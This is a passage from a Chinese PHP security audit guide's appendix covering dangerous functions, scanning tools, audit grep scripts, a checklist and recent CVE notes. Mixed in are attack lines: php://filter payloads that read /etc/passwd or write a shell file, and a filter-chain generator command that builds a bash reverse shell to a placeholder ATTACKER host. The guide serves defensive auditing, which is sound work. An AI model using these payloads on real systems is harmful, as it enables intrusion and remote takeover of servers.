composer show --outdated --strict  # CI 集成

# 4. 检查 composer.json/composer.lock 安全
# 关键检查项:
# - 是否锁定最低版本约束 (>= 而非 ^)
# - 是否有 dev 依赖泄露到生产环境
# - 是否有已知废弃/不维护的包
# - autoload 配置是否暴露敏感目录

# ==================== 高风险包黑名单 ====================
# 以下包已知有安全问题或不应在生产使用
# - maglnet/composer-require-checker  (依赖泄露)
# - phpunit/phpunit (仅 dev，不应出现在生产 vendor/)
# - mockery/mockery (仅 dev)
# - fuzz1h/unit3d (已知漏洞)
# - conspiracy/framework (恶意包示例)

# 5. 自动化 CI 集成
# .github/workflows/security.yml 示例
# name: Security Audit
# on: [push, pull_request]
# jobs:
#   audit:
#     runs-on: ubuntu-latest
#     steps:
#       - uses: actions/checkout@v4
#       - run: composer install
#       - run: composer audit
#       - run: vendor/bin/psalm --security-analysis
#       - run: semgrep --config p/php-security-audit .
```

### C.5 危险函数速查表（完整版）

| 函数/结构 | 风险等级 | 漏洞类型 | 安全替代 | 备注 |
|-----------|---------|---------|---------|------|
| **代码执行** | | | | |
| `eval()` | 🔴 Critical | RCE | 重构代码逻辑 | 绝对禁止用户输入 |
| `assert()` | 🔴 Critical | RCE (PHP <8) | 仅用于测试 | PHP 8+ 不执行字符串 |
| `preg_replace('/e')` | 🔴 Critical | RCE (PHP <7) | `preg_replace_callback()` | PHP 7+ 已移除 /e |
| `create_function()` | 🔴 Critical | RCE | 匿名函数 `fn() =>` | PHP 8.0 已移除 |
| `call_user_func()` | 🟡 High | 任意函数调用 | 限制回调白名单 | 检查回调是否可控 |
| `call_user_func_array()` | 🟡 High | 任意函数调用 | 限制回调白名单 | 同上 |
| `forward_static_call()` | 🟡 High | 任意函数调用 | 限制回调白名单 | 静态方法版本 |
| **命令执行** | | | | |
| `system()` | 🔴 Critical | 命令注入 | PHP 原生函数 | |
| `exec()` | 🔴 Critical | 命令注入 | PHP 原生函数 | |
| `shell_exec()` | 🔴 Critical | 命令注入 | PHP 原生函数 | |
| `passthru()` | 🔴 Critical | 命令注入 | PHP 原生函数 | |
| `popen()` | 🔴 Critical | 命令注入 | PHP 原生函数 | |
| `proc_open()` | 🔴 Critical | 命令注入 | PHP 原生函数 | |
| `` `command` `` | 🔴 Critical | 命令注入 | PHP 原生函数 | 反引号执行 |
| `pcntl_exec()` | 🔴 Critical | 命令注入 | PHP 原生函数 | |
| **反序列化** | | | | |
| `unserialize()` | 🔴 Critical | 反序列化 RCE | `json_decode()` | 或 `allowed_classes` |
| `__destruct()` | 🟡 High | POP Chain 入口 | 避免 phar:// 输入 | 魔术方法 |
| `__wakeup()` | 🟡 High | POP Chain 入口 | 同上 | |
| `__toString()` | 🟡 High | POP Chain 中间 | 避免对象拼接 | |
| `__invoke()` | 🟡 High | POP Chain 中间 | 避免对象当函数调用 | |
| **文件操作** | | | | |
| `include/require` | 🔴 Critical | LFI/RFI | 白名单文件名 | |
| `include_once/require_once` | 🔴 Critical | LFI/RFI | 白名单文件名 | |
| `file_get_contents()` | 🟡 High | SSRF/LFI | URL 白名单 + realpath | |
| `fopen()` | 🟡 High | LFI | 路径验证 | |
| `readfile()` | 🟡 High | LFI | 路径验证 | |
| `file_put_contents()` | 🟡 High | 任意文件写入 | 路径 + 名称验证 | |
| `fwrite()` | 🟡 High | 任意文件写入 | 路径验证 | |
| `move_uploaded_file()` | 🟡 High | 恶意文件上传 | MIME+内容+随机名 | |
| `parse_ini_file()` | 🟡 Medium | 信息泄露 | 限制路径 | |
| `highlight_file()` | 🟡 Medium | 源码泄露 | 限制路径 | |
| `show_source()` | 🟡 Medium | 源码泄露 | 限制路径 | |
| `unlink()` | 🟡 High | 任意文件删除 | 路径验证 | |
| `rename()` | 🟡 High | 文件重命名/移动 | 路径验证 | |
| `copy()` | 🟡 High | 文件复制 | 路径验证 | |
| **变量操作** | | | | |
| `extract()` | 🟡 High | 变量覆盖 | `EXTR_SKIP` 或不使用 | |
| `parse_str()` | 🟡 High | 变量覆盖 | 指定第二参数 | PHP 8+ 强制第二参数 |
| `parse_url()` | 🟠 Medium | URL 解析绕过 | 严格验证所有组件 | |
| `putenv()` | 🟡 High | 环境变量注入 | 不接受用户输入 | |
| `apache_setenv()` | 🟡 High | 环境变量注入 | 不接受用户输入 | |
| `ini_set()` | 🟡 High | 配置篡改 | 限制可修改项 | |
| **网络** | | | | |
| `curl_init()` | 🟡 High | SSRF | URL/IP 白名单 | |
| `header()` | 🟡 High | HTTP 响应分裂 | 过滤 CRLF | |
| `setcookie()` | 🟠 Medium | Cookie 篡改 | HttpOnly+Secure+SameSite | |
| **加密** | | | | |
| `md5()` | 🟠 Medium | 弱哈希 | `password_hash()` | 不用于密码 |
| `sha1()` | 🟠 Medium | 弱哈希 | `password_hash()` | 不用于密码 |
| `crc32()` | 🔴 Critical | 弱哈希 | 不用于安全目的 | |
| `mcrypt_*` | 🔴 Critical | 已废弃加密 | `openssl_encrypt` AES-GCM | PHP 7.1 移除 |
| `rand()` | 🟠 Medium | 可预测随机 | `random_int()` | |
| `mt_rand()` | 🟠 Medium | 可预测随机 | `random_int()` | |
| `array_rand()` | 🟠 Medium | 可预测随机 | `random_int()` 索引 | |
| **类型操作** | | | | |
| `==` (松散比较) | 🟠 Medium | 类型混淆 | `===` 严格比较 | 0 == "admin" → true |
| `in_array()` 无 strict | 🟠 Medium | 类型混淆 | `in_array($v, $arr, true)` | |
| `strcmp()` 返回值绕过 | 🟠 Medium | 认证绕过 | `hash_equals()` | |
| `switch` 松散比较 | 🟠 Medium | 类型混淆 | 使用 if + `===` | |
| **其他** | | | | |
| `mail()` + 附加头 | 🟡 High | 邮件头注入 | 使用库 (SwiftMailer/Symfony Mailer) | |
| `error_reporting(0)` | 🟠 Medium | 错误隐藏 | 使用自定义错误处理器 | |
| `header('Location:')` | 🟠 Medium | 开放重定向 | 白名单目标 | |
| `header('Content-Disposition:')` | 🟠 Medium | HTTP 响应分裂 | 过滤 CRLF | |
| `dl()` | 🔴 Critical | 加载恶意扩展 | 禁用 | |
| `ini_restore()` | 🟡 High | 恢复默认配置 | 不使用 | |

### C.6 安全审计工具（2025 更新）

```bash
# ==================== 1. Semgrep — 最佳 PHP 安全扫描器 ====================
# 安装
pip install semgrep

# PHP 安全规则集
semgrep --config p/php-security-audit .            # PHP 通用安全规则
semgrep --config p/xss .                           # XSS 专项
semgrep --config p/sql-injection .                 # SQL 注入专项
semgrep --config p/command-injection .             # 命令注入专项
semgrep --config p/noql-injection .                # NoSQL 注入
semgrep --config p/owasp-top-ten .                 # OWASP Top 10
semgrep --config p/jwt .                           # JWT 安全
semgrep --config p/insecure-transport .            # 不安全传输

# CI 集成
semgrep --config p/php-security-audit --json . > results.json
semgrep --config p/php-security-audit --sarif . > results.sarif

# ==================== 2. PHPStan — PHP 静态分析 ====================
# 安装
composer require --dev phpstan/phpstan

# 运行（安全相关级别）
vendor/bin/phpstan analyse app/ -l 5               # Level 5: 类型安全
vendor/bin/phpstan analyse app/ -l 8               # Level 8: 最严格

# 自定义安全规则
# phpstan.neon 配置
# parameters:
#   ignoreErrors: []    # 不要忽略安全相关错误
#   reportUnmatchedIgnoredErrors: true

# ==================== 3. Psalm — 类型安全 + 安全分析 ====================
# 安装
composer require --dev vimeo/psalm

# 安全分析模式
vendor/bin/psalm --no-cache
vendor/bin/psalm --security-analysis               # 启用安全分析
vendor/bin/psalm --taint-analysis                  # 污染分析（检测数据流）

# Psalm Taint Analysis 可检测:
# - SQL 注入: 用户输入 → SQL 查询
# - XSS: 用户输入 → HTML 输出
# - SSRF: 用户输入 → HTTP 请求
# - 命令注入: 用户输入 → 系统命令
# - 路径遍历: 用户输入 → 文件路径

# ==================== 4. PHPMD — PHP Mess Detector ====================
# 安装
composer require --dev phpmd/phpmd

# 运行
vendor/bin/phpmd app/ text cleancode,codesize,controversial,design,naming,unusedcode

# 安全相关规则（自定义）
# 检测: eval、exit、goto、未使用变量、过长方法等

# ==================== 5. PHP Compatibility ====================
# 检查 PHP 版本兼容性（发现废弃函数）
composer require --dev phpcompatibility/php-compatibility
vendor/bin/phpcs --standard=PHPCompatibility --runtime-set testVersion 8.2 app/

# ==================== 6. Composer 安全 ====================
# 已知漏洞审计
composer audit
composer audit --format=summary

# 废弃包检查
composer show --deprecated

# ==================== 7. 其他工具 ====================
# RIPS (商业): 专业 PHP 安全扫描，深度数据流分析
# SonarQube + PHP Plugin: CI/CD 集成安全扫描
# PHP Security Checker: composer.lock 漏洞检查
# Variant Analysis: 基于已知 CVE 模式搜索相似漏洞

# ==================== 完整审计流水线 ====================
#!/bin/bash
# php-security-audit.sh
APP_DIR=${1:-.}

echo "=== 1. Composer Audit ==="
cd "$APP_DIR" && composer audit

echo "=== 2. Semgrep Security Scan ==="
semgrep --config p/php-security-audit --config p/xss --config p/sql-injection "$APP_DIR"

echo "=== 3. PHPStan Analysis ==="
cd "$APP_DIR" && vendor/bin/phpstan analyse app/ -l 5 --no-progress

echo "=== 4. Psalm Taint Analysis ==="
cd "$APP_DIR" && vendor/bin/psalm --no-cache --taint-analysis

echo "=== 5. Dangerous Functions Grep ==="
cd "$APP_DIR"
echo "--- eval/assert ---"
grep -rn --include="*.php" -E '(eval|assert)\s*\(' app/
echo "--- Command Execution ---"
grep -rn --include="*.php" -E '(system|exec|shell_exec|passthru|popen|proc_open)\s*\(' app/
echo "--- Deserialization ---"
grep -rn --include="*.php" 'unserialize\s*\(' app/
echo "--- File Operations with User Input ---"
grep -rn --include="*.php" -E '(file_get_contents|fopen|readfile|include|require|file_put_contents)\s*\(\s*\$' app/
echo "--- phar:// Protocol ---"
grep -rn --include="*.php" 'phar://' app/
echo "--- Weak Crypto ---"
grep -rn --include="*.php" -E '(md5|sha1)\s*\(' app/ | grep -iv 'hash_equals\|password_verify'
echo "--- Loose Comparison ---"
grep -rn --include="*.php" ' == ' app/ | head -20
echo "--- Variable Override ---"
grep -rn --include="*.php" -E '(extract|parse_str)\s*\(' app/

echo "=== Audit Complete ==="
```

### C.7 MITRE ATT&CK 映射

| ATT&CK 技术 | PHP 漏洞/模式 | 审计检测方法 |
|-------------|--------------|-------------|
| **T1190 - Exploit Public-Facing Application** | 所有 Web 漏洞 | 入口点审计、路由分析 |
| **T1059.004 - Command and Scripting Interpreter: Unix Shell** | `system()/exec()/shell_exec()` | grep 命令执行函数 |
| **T1195.002 - Supply Chain Compromise: Software Supply Chain** | Composer 恶意包、依赖漏洞 | `composer audit` |
| **T1078 - Valid Accounts** | 弱密码哈希、认证绕过 | 检查 `md5/sha1` 用于密码 |
| **T1070.004 - Indicator Removal: File Deletion** | `unlink()` 任意文件删除 | 检查文件删除操作 |
| **T1005 - Data from Local System** | `file_get_contents()` LFI | 检查文件读取路径 |
| **T1041 - Exfiltration Over C2 Channel** | SSRF 数据外泄 | 检查 URL 输入点 |
| **T1566.001 - Phishing: Spearphishing Attachment** | 文件上传漏洞 | 检查上传处理逻辑 |
| **T1110.001 - Brute Force: Password Guessing** | 无速率限制的登录 | 检查认证端点 |
| **T1530 - Data from Cloud Storage** | S3/云存储配置泄露 | 检查 Storage 配置 |
| **T1036.004 - Masquerading: Masquerade Task or Service** | 文件上传 MIME 伪造 | 检查 MIME 验证方式 |
| **T1505.003 - Server Software Component: Web Shell** | 文件上传 → Webshell | 检查上传+执行路径 |
| **T1055 - Process Injection** | 反序列化 → RCE | 检查 `unserialize()` |
| **T1071.001 - Application Layer Protocol: Web** | SSRF 内网探测 | 检查 URL 参数 |
| **T1552.001 - Unsecured Credentials: Credentials In Files** | .env 泄露、硬编码密钥 | grep 敏感字符串 |
| **T1132.001 - Data Encoding: Standard Encoding** | 序列化数据传输 | 检查序列化/Cookie |
| **T1027 - Obfuscated Files or Information** | 代码混淆、eval 加密 | 检查 eval/base64_decode 组合 |
| **T1565 - Data Manipulation** | Mass Assignment | 检查 Model $fillable/$guarded |

### C.8 PHP Filter 链利用（2025 新增）

```php
// ==================== php://filter 高级利用 ====================
// PHP Filter 链可用于：无文件 getshell、读取源码、构造特定字节序列

// 1. 读取 PHP 源码（Base64 编码，绕过 PHP 解析）
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=/etc/passwd

// 2. Filter 链构造任意字节序列（用于文件包含 getshell）
// 利用多个 filter 串联将可控输入转换为合法 PHP 代码
// 原理: iconv/convert 过滤器可改变字节值
php://filter/convert.iconv.UTF-8.UTF-7|convert.base64-decode|...
// 完整利用链参见: https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html

// 3. rot13 绕过
php://filter/read=string.rot13/resource=config.php
// 或写入时编码
php://filter/write=string.rot13/resource=shell.php

// 审计: 检查所有接受 php:// 协议的位置
grep -rn 'php://filter' app/ --include="*.php"
grep -rn 'include.*\$' app/ --include="*.php" | grep -v 'realpath\|basename'
```

### C.9 PHP 原生类型安全最佳实践（PHP 8.x）

```php
// ==================== PHP 8.x 安全编码 ====================

// 1. 严格类型声明
declare(strict_types=1);  // 文件级别强制类型检查

// 2. 使用 Enum 替代魔术值
enum UserRole: string {
    case Admin = 'admin';
    case Editor = 'editor';
    case User = 'user';
}

function grantAccess(UserRole $role): bool {
    return $role === UserRole::Admin;
}

// 3. 使用 readonly 属性防止篡改
class SecureConfig {
    public function __construct(
        public readonly string $dbHost,
        public readonly string $dbUser,
        #[\SensitiveParameter]
        public readonly string $dbPass,
    ) {}
}

// 4. 使用 match 替代 switch（严格比较）
$action = match($_GET['action']) {
    'view' => $this->view(),
    'edit' => $this->edit(),
    default => $this->index(),  // 无匹配时执行
};
// 注意: match 使用 === 严格比较

// 5. Null 安全运算符避免空指针
$country = $user?->getAddress()?->getCountry();

// 6. 命名参数安全审计
// ❌ 危险: 允许用户控制参数名
call_user_func_array($function, $userInput);
// ✅ 安全: 显式指定参数
$function($userInput['name'], $userInput['value']);
// ✅ 或使用白名单
$allowed = ['name', 'email'];
$params = array_intersect_key($userInput, array_flip($allowed));
```

### C.10 审计清单（2025 完整版）

```
PHP 安全审计检查清单 v2.0
==========================

□ 1. 输入验证
  □ 1.1 所有 $_GET/$_POST/$_REQUEST/$_COOKIE 是否经过验证
  □ 1.2 是否使用 filter_input() 而非直接访问超全局
  □ 1.3 文件上传是否有完整验证链（MIME + 内容 + 扩展名 + 大小）
  □ 1.4 JSON/XML 输入是否安全解析（防 XXE）

□ 2. SQL 注入
  □ 2.1 所有查询是否使用预处理语句
  □ 2.2 ORDER BY/LIMIT 是否使用白名单
  □ 2.3 原始 SQL 是否有必要且安全
  □ 2.4 ORM 使用是否正确（Eloquent/Doctrine 安全模式）

□ 3. XSS
  □ 3.1 所有输出是否经过转义（HTML/属性/JS/URL）
  □ 3.2 模板引擎是否默认转义
  □ 3.3 未转义输出 ({!!} / |raw) 是否必要
  □ 3.4 Content-Security-Policy 是否配置

□ 4. 命令注入
  □ 4.1 是否可用 PHP 原生函数替代
  □ 4.2 参数是否经过 escapeshellarg/escapeshellcmd
  □ 4.3 是否存在参数注入（新参数注入）

□ 5. 文件操作
  □ 5.1 文件路径是否经过 realpath + 前缀检查
  □ 5.2 文件名是否经过白名单或随机化
  □ 5.3 文件上传是否使用 getimagesize() 或 finfo 验证
  □ 5.4 是否存在 phar:// 反序列化风险（PHP 7.x）

□ 6. 反序列化
  □ 6.1 是否使用 unserialize() 处理用户输入
  □ 6.2 是否可替换为 json_decode()
  □ 6.3 PHP 7.x 是否允许使用 allowed_classes
  □ 6.4 是否存在 POP Chain gadget 类
  □ 6.5 Session 序列化处理器是否一致

□ 7. 认证授权
  □ 7.1 密码是否使用 password_hash() (Argon2id/Bcrypt)
  □ 7.2 是否使用 hash_equals() 进行令牌比较
  □ 7.3 Session ID 是否在登录后重生成
  □ 7.4 Cookie 是否设置 HttpOnly + Secure + SameSite
  □ 7.5 API 是否有速率限制

□ 8. 加密
  □ 8.1 是否使用 AES-256-GCM 而非 ECB/CBC
  □ 8.2 IV 是否使用 random_bytes() 生成
  □ 8.3 密钥是否从安全来源加载（非硬编码）
  □ 8.4 是否已移除 mcrypt 依赖

□ 9. 框架特定
  □ 9.1 [Laravel] Mass Assignment 是否正确配置
  □ 9.2 [Laravel] 路由是否有适当的 middleware
  □ 9.3 [ThinkPHP] filter 参数是否可被用户覆盖
  □ 9.4 [ThinkPHP] where 数组是否防止注入
  □ 9.5 [Symfony] Doctrine 查询是否使用参数绑定
  □ 9.6 [WordPress] 是否使用 wp_verify_nonce
  □ 9.7 [WordPress] 是否使用 prepare() 进行 SQL 查询

□ 10. 基础设施
  □ 10.1 APP_DEBUG 是否在生产环境关闭
  □ 10.2 .env 文件是否在 Web 根目录外或被 .htaccess 阻止
  □ 10.3 php.ini 是否禁用危险函数
  □ 10.4 phar.readonly 是否开启
  □ 10.5 Composer 依赖是否无已知漏洞
  □ 10.6 PHP 版本是否为最新稳定版

□ 11. PHP 8.x 特有
  □ 11.1 是否存在命名参数注入风险
  □ 11.2 是否使用 SensitiveParameter 属性
  □ 11.3 是否利用 readonly 属性保护配置
  □ 11.4 是否使用 strict_types 声明
  □ 11.5 松散比较 (==) 是否已替换为严格比较 (===)
```

### C.11 PHP 8.4/8.5 安全相关变更（2025 更新）

```
PHP 版本生命周期（2026 年 6 月）
==================================
PHP 8.1  ← 2025-12-31 已停止维护（最终版本 8.1.34）
PHP 8.2  ← 安全修复模式（至 2026-11），仅修复关键安全漏洞
PHP 8.3  ← 安全修复模式（至 2027-12）
PHP 8.4  ← 活跃支持（至 2026-12），当前推荐生产版本
PHP 8.5  ← 活跃支持（至 2027-12），2025-11-20 发布，最新稳定版
```

```php
// ==================== PHP 8.4 安全相关特性 ====================

// 1. Property Hooks（属性钩子）— 安全审计新要点
// PHP 8.4 允许在属性上定义 get/set 钩子，替代传统 getter/setter
class User {
    public string $name {
        get => strtoupper($this->name);
        set => $value;  // 自动赋值到 backing store
    }

    // 安全用途: 在 set 钩子中强制验证
    public string $email {
        set {
            if (!filter_var($value, FILTER_VALIDATE_EMAIL)) {
                throw new InvalidArgumentException('Invalid email');
            }
            $this->email = $value;
        }
    }
}

// 审计注意:
// - Property Hooks 可改善输入验证，但开发者可能遗漏 set 钩子
// - Virtual properties（无 backing store）vs Backed properties 混淆可能引入 Bug
// - 反序列化时 property hooks 的行为需要测试

// 2. Asymmetric Visibility（不对称可见性）— 控制属性读写权限
class Config {
    public private(set) string $apiKey;  // 公开读取，仅类内可写
    public protected(set) string $env;   // 公开读取，子类可写
}
// 安全价值: 减少意外属性篡改，替代 __set 魔术方法

// 3. 新的 array_find/array_find_key 函数
// 减少回调函数中的复杂逻辑，降低逻辑漏洞风险
$admin = array_find($users, fn($u) => $u->role === 'admin');

// 4. HTML5 支持 (<script type=importmap>) — 新的 XSS 向量关注
// PHP 8.4 的 HTML5 解析器可能改变 DOM 解析行为

// 5. 惰性对象 (Lazy Objects) — PHP 8.4 RFC
// 代理对象的延迟初始化，注意 __destruct 在代理对象中的行为

// ==================== PHP 8.5 安全相关特性 ====================

// 6. PHP 8.5 于 2025-11-20 发布
// - 进一步的类型系统增强
// - 继续强化只读语义
// - 内置函数签名更新（可能影响命名参数注入）

// 审计 grep — 查找 Property Hooks 使用
grep -rn 'public.*{$' app/ --include="*.php" -A 3 | grep 'get\|set'
grep -rn 'private(set)\|protected(set)' app/ --include="*.php"

// 审计 grep — PHP 版本兼容性风险
// 旧代码在 PHP 8.4/8.5 上可能触发致命错误
// 重点关注: 已废弃的隐式 nullable 类型(?)
// PHP 8.4+ 废弃: function foo(string $x = null) → 应改为 ?string $x = null
grep -rn '= null)' app/ --include="*.php" | grep -v '?'
```

### C.12 2025-2026 PHP 关键 CVE 速查

| CVE | 影响 | CVSS | 类型 | 关键信息 |
|-----|------|------|------|----------|
| **CVE-2025-46337** | ADOdb (PHP DB 库) | **10.0** | SQL 注入 | PostgreSQL 驱动 `pg_insert_id()` 未转义 → 任意 SQL 执行。修复: 使用 `pg_escape_identifier()`。影响所有使用 ADOdb + PostgreSQL 的应用 |
| **CVE-2025-54068** | Laravel Livewire v3 ≤3.6.3 | **9.2** | RCE (反序列化) | 组件 hydration/update 机制中属性反序列化不安全 → 任意对象实例化 → RCE。无需认证。修复: 升级至 Livewire v3.6.4+ |
| **CVE-2025-1217** | PHP Core (所有版本) | 7.5 | 信息泄露 | 折叠 HTTP Header 解析错误，可导致敏感头部信息泄露 |
| **CVE-2025-1734** | PHP Core | 5.4 | 认证绕过 | 无冒号的畸形 HTTP Header 被视为有效，可绕过安全控制 |
| **CVE-2025-1735** | PHP Core | 9.8 | SQL 注入/崩溃 | 缺少错误检查导致 SQL 注入风险；空指针解引用导致崩溃 |
| **CVE-2025-14178** | PHP Core | 9.8 | 堆缓冲区溢出 | `array_merge()` 函数堆溢出，可导致内存损坏 → 潜在 RCE |
| **CVE-2025-14180** | PHP 8.1/8.2/8.3 | 高 | 多种 | PHP 8.1.34 前最终安全修复合集 |
| **CVE-2026-42551** | Flight PHP Framework | 中 | CSRF | HTTP 方法覆盖滥用，GET 请求可被升级为状态变更操作 |
| **CVE-2026-2599** | WordPress 插件生态 | **9.8** | PHP Object Injection | 未认证 PHP 对象注入，影响 WordPress HTML Token 插件 |
| **CVE-2026-7635** | coreActivity (WP 插件) | 高 | PHP Object Injection | WordPress 活动日志插件的 PHP 对象注入漏洞 |
| **CVE-2025-68853** | Kleor Contact Manager (WP) | 高 | PHP Object Injection | WordPress 联系人管理插件的 PHP 对象注入 |
| **CVE-2025-49401** | Quiz & Survey Master (WP) | 高 | PHP Object Injection | WordPress 问卷插件 PHP 对象注入，影响 ~40K 站点 |
| **CVE-2025-7384** | Contact Form Entries (WP) | 严重 | PHP Object Injection | WordPress 表单插件的 PHP 对象注入 |
| **CVE-2025-68526** | Modal Popup Box (WP) | 严重 | PHP Object Injection | WordPress 弹窗插件 PHP 对象注入，需升级至 1.6.2 |
| **CVE-2025-22510** | WooCommerce 插件 | 高 | PHP Object Injection | WooCommerce 相关插件 JSON 数据中 `serialized` 键的 PHP 对象注入 |
| **CVE-2025-54366** | Laravel 应用 | 高 | 不安全解密 | `Helper::decrypt` 方法处理 POST 参数时的不安全解密 |
| **CVE-2025-31924** | Crafts & Arts (WP) | 高 | PHP Object Injection | WordPress 工艺品插件的 PHP 对象注入 |
| **CVE-2025-7504** | WordPress Friends Plugin | 高 | PHP Object Injection | WordPress Friends 插件 v3.5.1 的 `query_vars` 反序列化漏洞 |
| **CVE-2025-24768** | Nitan | 高 | LFI | PHP 本地文件包含漏洞 |

```bash
# ==================== CVE 快速检查脚本 ====================
# 检查项目是否使用受影响组件

echo "=== ADOdb 检查 (CVE-2025-46337, CVSS 10.0) ==="
grep -rn 'ADOdb\|adodb' composer.lock composer.json --include="*.json" 2>/dev/null
grep -rn 'require_once.*adodb\|include.*adodb' . --include="*.php" 2>/dev/null

echo "=== Laravel Livewire 检查 (CVE-2025-54068, CVSS 9.2) ==="
grep -rn 'livewire/livewire' composer.lock 2>/dev/null
grep -rn 'use Livewire' app/ --include="*.php" 2>/dev/null | head -5

echo "=== PHP Object Injection 检查 (WordPress 生态) ==="
grep -rn 'unserialize\s*(' . --include="*.php" 2>/dev/null | grep -v 'vendor\|allowed_classes\|false'
grep -rn 'maybe_unserialize\|is_serialized' . --include="*.php" 2>/dev/null | grep -v vendor

echo "=== PHP 版本检查 ==="
php -v 2>/dev/null | head -1

echo "=== Flight PHP 检查 (CVE-2026-42551) ==="
grep -rn 'flight/engine\|flightphp' composer.lock composer.json 2>/dev/null
```

### C.13 Laravel Livewire v3 RCE 深度分析（CVE-2025-54068）

```php
// ==================== CVE-2025-54068 技术分析 ====================
// 漏洞: Laravel Livewire v3 ≤ 3.6.3 远程代码执行
// CVSS: 9.2 (Critical) | 认证: 无需 | 攻击面: 网络
// 根因: 组件 hydration/update 期间的属性反序列化
// 研究: Synacktiv / Hadrian

// 攻击原理:
// 1. Livewire 组件通过 AJAX 更新属性（wire:model）
// 2. 属性更新请求中包含序列化/类型化数据
// 3. hydration 过程中未充分验证属性类型
// 4. 攻击者可操纵请求数据 → 任意对象实例化 → POP Chain → RCE

// 受影响的请求格式 (Livewire 组件更新):
// POST /livewire/update
// {
//   "components": [{
//     "snapshot": {...},
//     "updates": {
//       "propertyName": {"type": "xxx", "value": "malicious_data"}
//     }
//   }]
// }

// 修复: Livewire v3.6.4 增加了严格的属性类型验证
// 防止非预期类型的对象被实例化

// ==================== 审计要点 ====================
// 1. 检查 Livewire 版本
grep -rn 'livewire/livewire' composer.lock | grep -oP 'v?\K[\d.]+'
// 2. 检查 Livewire 组件中是否有自定义属性类型
grep -rn 'public \$\w+.*;' app/Livewire/ --include="*.php"
// 3. 检查是否有 wire:model 绑定到敏感属性
grep -rn 'wire:model' resources/views/ --include="*.blade.php"
// 4. 检查是否有自定义 Hydration Hooks
grep -rn 'hydrate\|dehydrate\|HydrationMiddleware' app/ --include="*.php"

// ==================== 通用框架反序列化审计 ====================
// 任何使用组件化/序列化属性传输的框架都有类似风险:
// - Laravel Livewire (property hydration)
// - Symfony UX (component serialization)
// - Yii 2 Widgets (AJAX update)
// - ThinkPHP 8 (动态属性)
// 审计通用规则:
// 1. 追踪所有从 HTTP 请求到对象属性的数据流
// 2. 验证属性类型是否严格匹配预期
// 3. 检查是否存在可利用的 POP Chain gadget 类
```

### C.14 PHP Object Injection 在 WordPress 生态的持续威胁

```
WordPress 插件 PHP Object Injection 趋势分析（2025-2026）
===========================================================

2025-2026 年 WordPress 插件生态中出现大量 PHP Object Injection 漏洞，
表明 unserialize() 的滥用仍然是一个系统性问题。

关键发现:
---------
1. 受影响插件类型广泛: 表单、弹窗、日志、问卷、电商
2. 多数漏洞为"未认证"(Unauthenticated)，攻击门槛极低
3. 触发点分布:
   - 表单元数据反序列化 (Everest Forms ≤3.4.3)
   - query_vars 处理 (Friends Plugin 3.5.1)
   - JSON 数据中 serialized 键 (WooCommerce 插件)
   - 活动日志反序列化 (coreActivity 插件)
   - 联系人管理数据 (Kleor Contact Manager)

WordPress 对象注入审计 Checklist:
----------------------------------
□ 1. 搜索所有 unserialize() 调用
     grep -rn 'unserialize\s*(' . --include="*.php" | grep -v vendor

□ 2. 搜索 maybe_unserialize() (WordPress 特有)
     grep -rn 'maybe_unserialize' . --include="*.php" | grep -v vendor

□ 3. 检查 $_POST/$_GET/$_REQUEST 直接传入 unserialize
     grep -rn 'unserialize.*\$_\(GET\|POST\|REQUEST\|COOKIE\)' . --include="*.php"

□ 4. 检查 form entry metadata 是否经过序列化存储
     grep -rn 'serialize.*\$\(POST\|GET\|REQUEST\)' . --include="*.php"

□ 5. 检查 JSON API 端点中是否有 serialized 键
     grep -rn 'json_decode.*unserialize\|serialized.*true' . --include="*.php"

□ 6. 检查是否使用 __destruct/__wakeup/__toString gadget 类
     grep -rn '__destruct\|__wakeup\|__toString' . --include="*.php" | grep -v vendor

□ 7. 验证 WP_REST_API 端点是否验证用户输入
     grep -rn 'register_rest_route' . --include="*.php"

WordPress 安全编码规范 (防 Object Injection):
---------------------------------------------
// ❌ 危险: 直接反序列化用户输入
$data = unserialize($_POST['config']);

// ❌ 危险: 使用 maybe_unserialize 处理不可信来源
$data = maybe_unserialize($_GET['settings']);

// ✅ 安全: 使用 JSON
$data = json_decode(wp_unslash($_POST['config']), true);

// ✅ 安全: 使用 WordPress options API
$value = get_option('my_plugin_setting');

// ✅ 安全: 自定义解析而非反序列化
$data = explode('|', $_POST['config']);
```

### C.15 PHP Filter Chain 自动化利用工具

```bash
# ==================== php_filter_chain_generator ====================
# Synacktiv 出品的 PHP Filter Chain 自动化生成工具
# 可从 LFI 漏洞直接生成 RCE payload，无需文件上传
# GitHub: https://github.com/synacktiv/php_filter_chain_generator

# 安装
pip install php_filter_chain_generator
# 或
git clone https://github.com/synacktiv/php_filter_chain_generator.git

# 基本使用 — 生成执行 'id' 命令的 filter chain
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'

# 生成反向 shell
python3 php_filter_chain_generator.py --chain '<?php system("/bin/bash -c '\''bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'\''"); ?>'

# 生成的 payload 示例格式:
# php://filter/convert.iconv.UTF-8.UTF-7|convert.base64-decode|...|convert.base64-decode/resource=/var/www/html/index.php
# 将此 payload 传递给 include()/require()/file_get_contents() 等函数即可触发

# ==================== 利用条件 ====================
# 1. 目标存在 LFI (Local File Inclusion) 漏洞
# 2. include/require/file_get_contents 参数可控
# 3. PHP 版本 ≤ 8.0（PHP 8.1+ 部分过滤器行为变更，但仍有变体可用）
# 4. 不需要文件上传、日志写入等辅助条件

# ==================== 防御 ====================
# 1. 禁用 php:// 协议:
// if (preg_match('/^php:\/\//i', $input)) { die('Blocked'); }
# 2. 使用白名单文件路径
# 3. 在 php.ini 中设置: allow_url_include = Off
# 4. 升级 PHP 8.1+ 并测试 filter chain 是否仍可利用
# 5. 使用 open_basedir 限制文件访问范围

# ==================== 相关工具 ====================
# - Synacktiv PHP Filter Chain 原始论文:
#   https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it
# - PayloadsAllTheThings LFI 部分:
#   https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
# - HackTricks File Inclusion:
#   https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html
```

### C.16 Laravel 反序列化新 Gadget Chain（Quarkslab 研究）

```php
// ==================== Quarkslab 2025 新发现 ====================
// 来源: https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html
// Quarkslab 发现了 Laravel 框架中一条新的 POP Chain gadget

// 审计 Laravel 应用时应关注的 gadget 来源:
// 1. vendor/laravel/framework/src/Illuminate/ 中的所有 __destruct/__wakeup/__toString
